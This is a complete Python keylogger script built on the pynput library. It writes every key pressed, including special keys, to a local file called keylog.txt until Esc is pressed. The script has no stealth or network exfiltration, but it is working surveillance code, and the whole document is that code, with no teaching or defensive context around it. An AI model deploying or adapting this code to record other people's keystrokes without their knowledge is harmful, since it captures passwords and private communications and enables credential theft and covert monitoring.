import pynput
from pynput.keyboard import Key, Listener


LOG_FILE = "keylog.txt"

def on_press(key):
    """Callback function for key press events"""
    try:

        with open(LOG_FILE, "a") as f:
            f.write(f"{key.char}\n")
    except AttributeError:

        if key == Key.space:
            with open(LOG_FILE, "a") as f:
                f.write(" \n")
        elif key == Key.enter:
            with open(LOG_FILE, "a") as f:
                f.write("\n")
        else:
            with open(LOG_FILE, "a") as f:
                f.write(f"{key}\n")

def on_release(key):
    """Callback function for key release events"""
    if key == Key.esc:
        # Stop the listener when the Esc key is pressed
        return False

# Create a keyboard listener
listener = Listener(on_press=on_press, on_release=on_release)
listener.start()
listener.join()
